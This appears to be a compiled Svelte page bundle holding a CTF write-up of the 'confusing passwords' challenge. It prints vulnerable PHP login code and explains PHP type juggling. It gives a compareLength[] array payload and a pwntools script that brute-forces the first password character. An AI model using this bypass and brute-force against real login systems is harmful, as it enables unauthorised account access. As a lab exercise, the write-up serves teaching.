import{s as ka,n as rs}from"./scheduler.rijuCTql.js";import{S as da,i as ma,g as e,s as o,H as pn,h as p,I as c,c as l,j as on,z as ln,f as s,k as cn,a as t}from"./index.7JfBVtF2.js";function ha(oa){let i,us="confusing passwords",rn,r,ks='<a href="https://0x0539.net/play/minas_tirith/confusing_passwords" rel="nofollow">challenge</a>',un,u,ds=`👻  Admin Login
Prove [you're] an admin to access the flag.`,kn,k,ms="overview",dn,d,hs="the challenge landing page presents us with the login form and the page’s source code. its a php-based login form, and the source immediately confirms a handful of credentials:",mn,m,hn,la=`<code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
  <span class="token comment">// First check if the player wants to view the source, if so we'll display then kill the page.</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"viewsrc"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/pre>"</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">function</span> <span class="token function-definition function">checkCredentials</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$correctUser</span><span class="token punctuation">,</span> <span class="token variable">$correctPassword</span><span class="token punctuation">,</span> <span class="token variable">$checkCompareLen</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span> <span class="token operator">!=</span> <span class="token variable">$correctUser</span><span class="token punctuation">)</span>
      <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>

    <span class="token comment">// Let's ensure the compare length is greater than or equal to the correctPassword size to ensure that</span>
    <span class="token comment">// it's fully compared.</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$checkCompareLen</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$correctPassword</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>

    <span class="token comment">// We should also check against an integer overflow</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$checkCompareLen</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
      <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>

    <span class="token comment">// Finally, compare the passwords</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">strncmp</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$correctPassword</span><span class="token punctuation">,</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$checkCompareLen</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token variable">$loginAttempted</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
  <span class="token variable">$loginSuccess</span>   <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>

  <span class="token variable">$correctUsername</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span> <span class="token comment">// ok</span>
  <span class="token variable">$correctPassword</span>  <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/adminpwd.txt"</span><span class="token punctuation">,</span> <span class="token constant">FILE_USE_INCLUDE_PATH</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// :D</span>
  <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag.txt"</span><span class="token punctuation">,</span> <span class="token constant">FILE_USE_INCLUDE_PATH</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// Check that all fields are set before attempting to login</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"compareLength"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token variable">$checkUsername</span>    <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$checkPassword</span>    <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$checkCompareLen</span>  <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"compareLength"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token variable">$loginAttempted</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token variable">$loginSuccess</span>   <span class="token operator">=</span> <span class="token function">checkCredentials</span><span class="token punctuation">(</span><span class="token variable">$checkUsername</span><span class="token punctuation">,</span> <span class="token variable">$checkPassword</span><span class="token punctuation">,</span> <span class="token variable">$correctUsername</span><span class="token punctuation">,</span> <span class="token variable">$correctPassword</span><span class="token punctuation">,</span> <span class="token variable">$checkCompareLen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span>

// [ and then the page's html &amp; css. ]</code>`,fn,h,fs="initial enumeration",vn,f,vs="upon initial inspection, the above source code indicates that any username entered into the site is checked against the string <code>admin</code>. furthermore, the <code>checkCredentials</code> function ensures",gn,v,gs="<li>all parameters are included in request, and</li> <li>the <code>username</code> and <code>compareLength</code> parameters contain a value.</li>",wn,g,ws="we can run some requests through burpsuite to modify POST data - this test form gives us a general idea of the intended form functionality - we also see that the default value for <code>compareLength</code> is <code>32</code>.",bn,w,bs='<img src="/img/confusing_passwords_img/burp_post_test.png" alt="burp_post_test"/>',yn,b,ys="the final line <code>return (strncmp($password, $correctPassword, intval($checkCompareLen)) === 0);</code> is especially interesting here. it looks like the program compares <code>$password</code> against <code>$correctPassword</code> for each character for a maximum of <code>intval($checkCompareLen)</code> characters and returning true if all compared characters match -  if we set <code>checkCompareLen</code> to <code>0</code> in a POST request, <code>intval($checkCompareLen)</code> would be <code>0</code>, and we may be able to login without a password.",_n,y,_s="upon sending a request with <code>compareLength=0</code>, we note the lack of a <code>login failed</code> warning - feeback that the page isnt processing our request in the same manner as before:",Ln,_,Ls='<img src="/img/confusing_passwords_img/burp_post_test_2.png" alt="burp_post_test"/>',xn,L,xs="looking at the markup for rendering the <code>Login failed</code> warning, we can see that it is displayed if <code>$loginSuccess != true</code> AND <code>$loginAttempted == true</code>.",Cn,x,Cs="i <em>assume</em> that this occurs as <code>!empty($_POST[&quot;compareLength&quot;]))</code> returns <code>false</code> when its value is <code>0</code>, and so <code>$loginAttempted</code> is not updated to <code>true</code> and the banner is not rendered:",Tn,C,Hn,ca=`<code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">// ...</span>
<span class="token keyword">function</span> <span class="token function-definition function">checkCredentials</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$correctUser</span><span class="token punctuation">,</span> <span class="token variable">$correctPassword</span><span class="token punctuation">,</span> <span class="token variable">$checkCompareLen</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span> <span class="token operator">!=</span> <span class="token variable">$correctUser</span><span class="token punctuation">)</span>
      <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$checkCompareLen</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$correctPassword</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$checkCompareLen</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
      <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">strncmp</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$correctPassword</span><span class="token punctuation">,</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$checkCompareLen</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token comment">// ...</span>
<span class="token delimiter important">?></span></span>

  // the section in markup where the check to determine if a 'login failed' warning needs to be rendered:

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$loginSuccess</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token delimiter important">?></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>alert alert-success<span class="token punctuation">"</span></span> <span class="token attr-name">role</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>alert<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        Welcome <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$correctUsername</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>. Since you've authenticated as an admin, here's the secret flag: <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$loginSuccess</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$loginAttempted</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token delimiter important">?></span></span>     // <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>--</span> <span class="token attr-name">note</span> <span class="token attr-name">the</span> <span class="token attr-name">&#96;&amp;&amp;&#96;</span> <span class="token attr-name">operator</span>
        <span class="token attr-name">&lt;div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>alert alert-danger<span class="token punctuation">"</span></span> <span class="token attr-name">role</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>alert<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            Login failed.
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token punctuation">&#125;</span> <span class="token delimiter important">?></span></span></code>`,Pn,T,Ts="ultimately, this means the page doesnt run checks on our <code>compareLength</code> if it is set to <code>0</code> in this way.",Mn,H,Hs="vulnerabilities",$n,P,Ps="so to reiterate purely on speculation using the source code:",qn,M,Ms="<li>the <code>username</code> parameter must be the same value as <code>$correctUser</code>, and</li> <li>the posted <code>compareLength</code> parameter has to be both:<ol><li>a positive integer greater than <code>0</code>,</li> <li>a value greater than or equal to the length of <code>$correctPassword</code>.</li></ol></li>",Sn,$,$s="<code>username</code> parameter",Un,q,qs="we already know from source code that the correct username is <code>admin</code>; <code>username</code> ultimately doesn’t appear to play any further role in authentication, so we can ignore this for now.",En,S,Ss="instead, we may be able to modify our POST request to pass an unexpected value to the <code>password</code> or <code>compareLength</code> checks, which may invoke some unexpected behaviour.",An,U,Us="we can do this using a vulnerability called <code>type juggling</code>, which is a result of a programming language converting different object types to a “common value” when it is asked to run comparisons on them. in PHP, these vulnerabilities are commonly the result of ‘loose’ comparison operators (e.g., <code>==</code>, <code>!=</code>), which will compare only the <em>value</em> stored in an object when invoked.",On,E,Es="conversely, ‘strict’ operators (<code>===</code>, <code>!==</code>, and so on) will also compare the <em>type</em> of each object alongside its value.",jn,A,As="<code>password</code> parameter",In,O,Os="to explain this in a little more detail - if the page had used a regular <code>strcmp()</code> function (as opposed to <code>str&lt;n&gt;cmp()</code>) with a loose comparison operator, we could modify the password parameter of a POST request as follows:",Nn,j,Rn,ia=`<code class="language-php"><span class="token comment">// a hypothetical webpage might try to validate a password with a &#96;strcmp()&#96; function, and</span>
<span class="token comment">// then comparing its returned value to &#96;0&#96;:</span>
<span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$correctPassword</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment">// &#96;strcmp()&#96; wants to operate on two string objects, as it will compare each character in each string, incrementing</span>
<span class="token comment">// the returning value by 1 for each differing character:</span>
<span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"password123"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"password123"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">// returns &#96;true&#96; as there are 0 different characters.</span>

<span class="token comment">// in the above example, if we were to make a post request with the following parameters:</span>
username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>

<span class="token comment">// it would be evaulated as:</span>
<span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token keyword">Array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"real_password123"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">// returns &#96;true&#96;; &#96;Array()&#96; == &#96;NULL&#96; == &#96;0&#96;.</span>
<span class="token comment">// an unexpected array object is determined by &#96;strcmp()&#96; to contain the value &#96;NULL&#96;;</span>
<span class="token comment">// PHP considers &#96;NULL&#96; to be "loosely" equal to &#96;0&#96;, and so the login form will return &#96;true&#96; under this condition.</span></code>`,Wn,I,js="we are not dealing with the exact functionality as indicated above due to the strict comparison operation, but serves as a simple example - there are a number of type conversions that take place before our input is compared to <code>0</code> at the end of the <code>checkCredentials</code> function, which leaves significant room for error.",zn,N,Is="we <em>also</em> get rendered feedback regarding the evaluation of our modified <code>password</code> parameter, so we can programmatically use page data to check when the page has run a <code>strncmp</code> comparison on our input:",Fn,R,Ns='<img src="/img/confusing_passwords_img/burp_post_test_3.png" alt="burp_post_test"/>',Dn,W,Rs="as the password value isn’t used in loose operations, however, it isnt feasible to directly trick the form with type juggling.",Bn,z,Ws="<code>compareLength</code> parameter",Gn,F,zs="regarding <code>compareLength</code>; there are a handful of odd functions performed with the value of this parameter, so we might be able to push through a value that is <code>&gt; 0</code>, passes all ‘pre-strncmp()’ statements, and also results in a low number when the page uses it to index the number of characters to check; even if this were a value like <code>3</code> or <code>4</code>, the form would be dramatically easier to bruteforce.",Kn,D,Fs="exploit",Qn,B,Ds='thankfully, <code>intval()</code> is used to convert the data in <code>compareLength</code> to an integer; a practice that the <a href="https://www.php.net/manual/en/function.intval.php" rel="nofollow">php documenataion <strong>strongly</strong> advises against when dealing with objects</a>:',Yn,G,Bs="<p>Returns the int value of value, using the specified base for the conversion (the default is base 10). <strong>intval() should not be used on objects, as doing so will emit an E_WARNING level error and return 1.</strong></p>",Zn,K,Gs="another notable quirk about PHP & arrays (as it related to the page’s functionality): array objects are always considered greater than any non-array object (without considering their actual values), so a request with an empty array will pass both the pre-check tests.",Jn,Q,Ks="so, if we pass an Array to the <code>compareLength</code> parameter:",Vn,Y,Qs="<li>it will be a larger number than the length of <code>correctPassword</code> simply on principle, but</li> <li><code>intval()</code> evaluates it as <code>1</code>,</li>",Xn,Z,Ys="so <code>strncmp()</code> will only compare the first character in <code>$correctPassword</code> and our <code>password</code> parameter; meaning we only need to enumerate through one set of valid characters - likely in the realm of a <em>maximum</em> of ~52 characters (the first character is likely [<code>a-Z</code>]).",ns,J,Zs="we can check that our interpretation of the request is correct by submitting a post request with the <code>password</code> and <code>compareLength</code> params as arrays; if the page renders the <code>strncmp</code> warning, we know that it tried to parse the arrays as strings:",ss,V,Js='<img src="/img/confusing_passwords_img/burp_post_test_4.png" alt="burp_post_test"/>',as,X,Vs="with this theory confirmed, a quick python script using header info from burpsuite to feed into <code>pwntools</code>:",ts,nn,Xs="<li>we make a post request with a malformed <code>compareLength</code> parameter,</li> <li>the response is checked against a success condition; failed attempts are ignored,</li> <li>upon finding a successful request, strips irrelevant HTML (based on the markup, we see a successful login will contain ’<code>Welcome &lt;?php echo $correctUsername; ?&gt;. Since you&#39;ve authenticated as an admin, here&#39;s the secret flag: &lt;?php echo $flag; ?&gt;</code>’, though this could just as easily be replace with the opposite operation; something like <code>if not b&#39;Login failed&#39; in response</code>):</li>",es,sn,ps,ra=`<code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

charset <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()-=+_&lt;>'</span>
charset <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">*</span>charset<span class="token punctuation">]</span>
<span class="token keyword">for</span> char <span class="token keyword">in</span> charset<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'trying </span><span class="token interpolation"><span class="token punctuation">&#123;</span>char<span class="token punctuation">&#125;</span></span><span class="token string">...'</span></span><span class="token punctuation">)</span>
    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenges.0x0539.net'</span><span class="token punctuation">,</span><span class="token number">3011</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'POST /index.php HTTP/1.1&#92;r&#92;n'</span>
            <span class="token string">'Content-Length: 42&#92;r&#92;n'</span>
            <span class="token string">'Host: challenges.0x0539.net:3011&#92;r&#92;n'</span>
            <span class="token string">'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#92;r&#92;n'</span>
            <span class="token string">'Referer: http://challenges.0x0539.net:3011/index.php&#92;r&#92;n'</span>
            <span class="token string">'Content-Type: application/x-www-form-urlencoded&#92;r&#92;n'</span>
            <span class="token string">'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#92;r&#92;n'</span>
            <span class="token string">'Connection: close&#92;r&#92;n&#92;r&#92;n'</span>
            <span class="token string">'username=admin&amp;password=&#123;&#125;&amp;compareLength[]='</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span>

    response <span class="token operator">=</span> r<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">b'the secret flag:'</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span> <span class="token comment"># alternatively, &#96;if not b'Login failed' in response&#96;...</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'&#92;n####### &#92;n'secret flag' found in response. trimmed output:'</span></span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">b' Welcome admin.'</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">b'&lt;/div>&#92;n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'#######'</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span></code>`,os,an,na="flag",ls,tn,sa="running the script, we get a successful login on a POST with <code>&amp;password=f</code>:",cs,en,is,ua=`<code class="language-lua">┌──<span class="token punctuation">(</span>root㉿RUBY<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">/</span>mnt<span class="token operator">/</span>…<span class="token operator">/</span>ctf<span class="token operator">/</span>sites<span class="token operator">/</span><span class="token number">0x0539</span><span class="token operator">/</span>confusing<span class="token operator">-</span>passwords<span class="token punctuation">]</span>
└─<span class="token operator">#</span> python pass_enum<span class="token punctuation">.</span>py
trying a<span class="token punctuation">...</span>
<span class="token operator">/</span>mnt<span class="token operator">/</span>a<span class="token operator">/</span>ctf<span class="token operator">/</span>sites<span class="token operator">/</span><span class="token number">0x0539</span><span class="token operator">/</span>confusing<span class="token operator">-</span>passwords<span class="token operator">/</span>pass_enum<span class="token punctuation">.</span>py<span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">:</span> BytesWarning<span class="token punctuation">:</span> Text is <span class="token keyword">not</span> bytes<span class="token punctuation">;</span> assuming ASCII<span class="token punctuation">,</span> no guarantees<span class="token punctuation">.</span> See https<span class="token punctuation">:</span><span class="token operator">//</span>docs<span class="token punctuation">.</span>pwntools<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token operator">#</span>bytes
  r<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'POST /index.php HTTP/1.1&#92;r&#92;n'</span>
trying b<span class="token punctuation">...</span>
trying c<span class="token punctuation">...</span>
trying d<span class="token punctuation">...</span>
trying e<span class="token punctuation">...</span>
trying f<span class="token punctuation">...</span>
<span class="token operator">#</span><span class="token operator">#</span><span class="token operator">#</span><span class="token operator">#</span><span class="token operator">#</span><span class="token operator">#</span><span class="token operator">#</span>
<span class="token string">'secret flag'</span> found <span class="token keyword">in</span> response<span class="token punctuation">.</span> appending trimmed output<span class="token punctuation">:</span>

b<span class="token string">"Since you've authenticated as an admin, here's the secret flag: FLAG&#123;*redacted*&#125;"</span>
<span class="token operator">#</span><span class="token operator">#</span><span class="token operator">#</span><span class="token operator">#</span><span class="token operator">#</span><span class="token operator">#</span><span class="token operator">#</span></code>`;return{c(){i=e("h1"),i.textContent=us,rn=o(),r=e("p"),r.innerHTML=ks,un=o(),u=e("aside"),u.textContent=ds,kn=o(),k=e("h2"),k.textContent=ms,dn=o(),d=e("p"),d.textContent=hs,mn=o(),m=e("pre"),hn=new pn(!1),fn=o(),h=e("h2"),h.textContent=fs,vn=o(),f=e("p"),f.innerHTML=vs,gn=o(),v=e("ul"),v.innerHTML=gs,wn=o(),g=e("p"),g.innerHTML=ws,bn=o(),w=e("p"),w.innerHTML=bs,yn=o(),b=e("p"),b.innerHTML=ys,_n=o(),y=e("p"),y.innerHTML=_s,Ln=o(),_=e("p"),_.innerHTML=Ls,xn=o(),L=e("p"),L.innerHTML=xs,Cn=o(),x=e("p"),x.innerHTML=Cs,Tn=o(),C=e("pre"),Hn=new pn(!1),Pn=o(),T=e("p"),T.innerHTML=Ts,Mn=o(),H=e("h2"),H.textContent=Hs,$n=o(),P=e("p"),P.textContent=Ps,qn=o(),M=e("ol"),M.innerHTML=Ms,Sn=o(),$=e("h3"),$.innerHTML=$s,Un=o(),q=e("p"),q.innerHTML=qs,En=o(),S=e("p"),S.innerHTML=Ss,An=o(),U=e("p"),U.innerHTML=Us,On=o(),E=e("p"),E.innerHTML=Es,jn=o(),A=e("h3"),A.innerHTML=As,In=o(),O=e("p"),O.innerHTML=Os,Nn=o(),j=e("pre"),Rn=new pn(!1),Wn=o(),I=e("p"),I.innerHTML=js,zn=o(),N=e("p"),N.innerHTML=Is,Fn=o(),R=e("p"),R.innerHTML=Ns,Dn=o(),W=e("p"),W.textContent=Rs,Bn=o(),z=e("h3"),z.innerHTML=Ws,Gn=o(),F=e("p"),F.innerHTML=zs,Kn=o(),D=e("h3"),D.textContent=Fs,Qn=o(),B=e("p"),B.innerHTML=Ds,Yn=o(),G=e("blockquote"),G.innerHTML=Bs,Zn=o(),K=e("p"),K.textContent=Gs,Jn=o(),Q=e("p"),Q.innerHTML=Ks,Vn=o(),Y=e("ul"),Y.innerHTML=Qs,Xn=o(),Z=e("p"),Z.innerHTML=Ys,ns=o(),J=e("p"),J.innerHTML=Zs,ss=o(),V=e("p"),V.innerHTML=Js,as=o(),X=e("p"),X.innerHTML=Vs,ts=o(),nn=e("ol"),nn.innerHTML=Xs,es=o(),sn=e("pre"),ps=new pn(!1),os=o(),an=e("h2"),an.textContent=na,ls=o(),tn=e("p"),tn.innerHTML=sa,cs=o(),en=e("pre"),is=new pn(!1),this.h()},l(n){i=p(n,"H1",{"data-svelte-h":!0}),c(i)!=="svelte-4o0usy"&&(i.textContent=us),rn=l(n),r=p(n,"P",{"data-svelte-h":!0}),c(r)!=="svelte-2ng4p6"&&(r.innerHTML=ks),un=l(n),u=p(n,"ASIDE",{"data-svelte-h":!0}),c(u)!=="svelte-qi8cif"&&(u.textContent=ds),kn=l(n),k=p(n,"H2",{"data-svelte-h":!0}),c(k)!=="svelte-1rxqya9"&&(k.textContent=ms),dn=l(n),d=p(n,"P",{"data-svelte-h":!0}),c(d)!=="svelte-1ih6csj"&&(d.textContent=hs),mn=l(n),m=p(n,"PRE",{class:!0});var a=on(m);hn=ln(a,!1),a.forEach(s),fn=l(n),h=p(n,"H2",{"data-svelte-h":!0}),c(h)!=="svelte-1t3hxhr"&&(h.textContent=fs),vn=l(n),f=p(n,"P",{"data-svelte-h":!0}),c(f)!=="svelte-1jqlzce"&&(f.innerHTML=vs),gn=l(n),v=p(n,"UL",{"data-svelte-h":!0}),c(v)!=="svelte-lsmg4p"&&(v.innerHTML=gs),wn=l(n),g=p(n,"P",{"data-svelte-h":!0}),c(g)!=="svelte-lebmgp"&&(g.innerHTML=ws),bn=l(n),w=p(n,"P",{"data-svelte-h":!0}),c(w)!=="svelte-rf5dqa"&&(w.innerHTML=bs),yn=l(n),b=p(n,"P",{"data-svelte-h":!0}),c(b)!=="svelte-1k8r7o6"&&(b.innerHTML=ys),_n=l(n),y=p(n,"P",{"data-svelte-h":!0}),c(y)!=="svelte-1nm9os7"&&(y.innerHTML=_s),Ln=l(n),_=p(n,"P",{"data-svelte-h":!0}),c(_)!=="svelte-1k09r8h"&&(_.innerHTML=Ls),xn=l(n),L=p(n,"P",{"data-svelte-h":!0}),c(L)!=="svelte-yugh1f"&&(L.innerHTML=xs),Cn=l(n),x=p(n,"P",{"data-svelte-h":!0}),c(x)!=="svelte-4gg0gd"&&(x.innerHTML=Cs),Tn=l(n),C=p(n,"PRE",{class:!0});var 